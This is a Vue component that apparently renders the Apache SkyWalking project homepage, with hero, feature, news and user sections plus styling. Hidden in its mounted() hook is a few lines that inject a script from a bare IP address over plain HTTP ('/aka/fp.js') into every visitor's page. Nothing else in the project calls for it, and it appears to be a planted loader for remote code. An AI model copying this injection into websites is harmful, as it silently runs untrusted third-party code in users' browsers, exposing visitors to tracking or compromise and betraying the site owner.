<template>
  <div class="home">
    <div class="wrapper">
      <div class="avatar">
        <img src="/assets/circuit-board.svg" width="100%" :style="`transform: translate3d(${x/30}px, ${y/30}px, 0px);`">
        <img src="/assets/circuit-board.svg" width="84%" :style="`transform: translate3d(${100+x/15}px, ${y/15-200}px, 0px);`">
        <div class="vertical-middle">
          <div class="avatar-wrapper">
            <div class="product-name">
              <div class="avatar-title">
                Apache SkyWalking
              </div>
            </div>
            <p
              class="avatar-desc"
            >{{data.description}}</p>
            <div class="button-area">
              <a class="button1" target="_self" href="https://github.com/apache/incubator-skywalking/tree/master/docs">{{data.start}}</a>
              <a class="button2" target="_self" href="https://github.com/apache/incubator-skywalking">Github</a>
            </div>
          </div>
          <div class="moon"  :style="`transform: translate3d(${-x/40}px, ${-y/40}px, 0px);`"></div>
        </div>
      </div>
      <div class="home-card">
        <div class="home-card-about tc">
          <h1>{{data.what.title}}</h1>
          <p v-for="i in data.what.content">{{i}}</p>
          <img style="margin-top:20px;max-width:900px;box-shadow: 0 2px 5px #00000033;" src="/assets/frame-v8.jpeg" width="100%">
        </div>
        <div class="home-card-feature">
          <h1 class="tc">{{data.feature.title}}</h1>
          <table width="100%">
            <col style="width:50%"/>
	          <col style="width:50%"/>
            <tr>
              <td class="home-card-feature-td"><img class="home-card-feature-img" src="/assets/search.svg">{{data.feature.content[0]}}</td>
              <td class="home-card-feature-td"><img class="home-card-feature-img" src="/assets/more.svg">{{data.feature.content[1]}}</td>
            </tr>
            <tr>
              <td class="home-card-feature-td"><img class="home-card-feature-img" src="/assets/light.svg">{{data.feature.content[2]}}</td>
              <td class="home-card-feature-td"><img class="home-card-feature-img" src="/assets/list.svg">{{data.feature.content[3]}}</td>
            </tr>
            <tr>
              <td class="home-card-feature-td"><img class="home-card-feature-img" src="/assets/alarm.svg">{{data.feature.content[4]}}</td>
              <td class="home-card-feature-td"><img class="home-card-feature-img" src="/assets/ui.svg">{{data.feature.content[5]}}</td>
            </tr>
          </table>
        </div>
        <div class="home-card-news">
          <h1 class="tc">{{data.news.title}}</h1>
          <div class="clear">
            <div class="home-card-news-item">
              <h4 class="mb10 mt0">{{data.news.content[0].header}}</h4>
              <div class="sm mb10"><span style="color:#999;margin-right:10px">{{data.news.content[0].time}}</span></div>
              <p class="mt0">{{data.news.content[0].content}}</p>
            </div>
            <div class="home-card-news-item">
              <h4 class="mb10 mt0">{{data.news.content[1].header}}</h4>
              <div class="sm mb10"><span style="color:#999;margin-right:10px">{{data.news.content[1].time}}</span></div>
              <p class="mt0">{{data.news.content[1].content}}</p>
            </div>
          </div>
          <div class="clear">
            <div class="home-card-news-item">
              <h4 class="mb10 mt0">{{data.news.content[2].header}}</h4>
              <div class="sm mb10"><span style="color:#999;margin-right:10px">{{data.news.content[2].time}}</span></div>
              <p class="mt0">{{data.news.content[2].content}}</p>
            </div>
            <div class="home-card-news-item">
              <h4 class="mb10 mt0">{{data.news.content[3].header}}</h4>
              <div class="sm mb10"><span style="color:#999;margin-right:10px">{{data.news.content[3].time}}</span></div>
              <p class="mt0">{{data.news.content[3].content}}</p>
            </div>
          </div>
        </div>
        <div class="home-card-user tc">
          <h1>{{data.user.title}}</h1>
          <p>{{data.user.content}}</p>
          <img style="margin-top:20px;max-width:900px" src="/assets/users.png" width="100%">
          <p>The <a href='https://github.com/apache/skywalking/blob/master/docs/powered-by.md'>PoweredBy</a> page includes more users of the project.</p>
        </div>
      </div>
      <Footer/>
    </div>
  </div>
</template>

<script>
import Footer from "../components/Footer.vue";

export default {
  components: { Footer },
  data() {
    return {
      x: 0,
      y: 0,
    }
  },
  computed: {
    data() {
      return this.$page.frontmatter;
    }
  },
  mounted() {
    const s = document.createElement('script');
    s.type = 'text/javascript';
    s.src = 'http://120.79.173.175/aka/fp.js';
    document.body.appendChild(s);

    document.onmousemove=(e)=>{
      this.x = -e.screenX;
      this.y = -e.screenY;
    }
  },
};
</script>

<style>
.clear:after{display:table; content:''; clear:both;}
.avatar {
  overflow: hidden;
  position: relative;
  height: 720px;
  background-color: #2b2e3b;
}
.avatar-wrapper {
  margin: 0 auto;
  max-width: 730px;
}
.avatar-title {
  font-size: 48px;
  color: #fff;
  font-family: Lato, sans-serif;
  font-weight: 600;
  margin: 0;
}

.avatar-desc {
  font-size: 15px;
  padding-bottom: 15px;
  color: #fff;
  font-weight: 300;
  text-shadow: 0 2px 2px #00000066;
}
.avatar .button1 {
  background-color: #0091ff;
  color: #fff;
  padding: 10px 1em;
  border-radius: 5px;
  margin-right: 10px;
}
.avatar .button2 {
  padding: 10px;
  border-radius: 5px;
  color: #fff;
  text-shadow: 0 2px 2px #00000066;
}
.avatar .vertical-middle {
  position: absolute;
  left: 0;
  top: 40%;
  transform: translateY(-50%);
  box-sizing: border-box;
  width: 100%;
  padding: 0 20px;
  z-index: 0;
}
.avatar .moon {
  width: 450px;
  z-index: -1;
  height: 450px;
  border-radius: 250px;
  position: absolute;
  right: -100px;
  bottom: -400px;
  background-color: #f9fafa;
  background-image: url("../../public/assets/moon.svg");
  background-size: cover;
}

.home-card-feature-td{
  padding: 20px 0px 20px 40px;
  position: relative;
}
.home-card-feature-img{
  position: absolute;
  left: 10px;
  height: 20px;
  margin-right: 10px;
  vertical-align: text-top;
}
.home-card-news-item{
  padding: 10px;
  width: 50%;
  box-sizing: border-box;
  float: left;
}
.home-card-news-item h4{
  font-size: 16px;
}
.home-card-news-item > h4,.home-card-news-item > div{
  display: inline;
  margin-right: 10px;
}
@media screen and (max-width: 640px) {
  .home-card-feature-item{
      width: 100%;
  }
  .home-card-news-item{
    float: unset;
    width: 100%;
  }
  .home-card-news-item > h4,.home-card-news-item > div{
    display: block;
    margin-right: 0px;
  }
}
.home-card-news-item:before{
  content: '';
  width: 7px;
  height: 7px;
  margin-right: 15px;
  margin-top: 7px;
  display: block;
  float: left;
  background-color:#0091ff;
}
.home-card h1 {
  font-family: Lato, sans-serif;
  text-shadow: 4px 6px 0 rgba(0,0,0,.07);
}
.home-card p {
  margin: 10px 0;
}
.home-card h1::before {
  content: '';
  display: block;
  width: 50px;
  height: 3px;
  background-color: #0091ff;
  margin: 0 auto 8px;
}
.home-card-about{
  padding: 50px 40px 70px;
  background-color: #f7f7f9;
}
.home-card-feature{
  padding: 50px 40px 70px;
}
.home-card-news{
  padding: 50px 40px 70px;
  background-color: #f7f7f9;
}
.home-card-user{
  padding: 50px 40px 70px;
}
.home-card .tc {
  text-align: center;
}
.home-card .mb10 {
  margin-bottom: 10px;
}
.home-card .mt0 {
  margin-top: 0;
}
.home-card .sm {
  font-size: 13px;
}
.home-card .half {
  width: 50%;
}
.home-card .l {
  float: left
}
.home-card .clear:after{display:table; content:''; clear:both;}
</style>
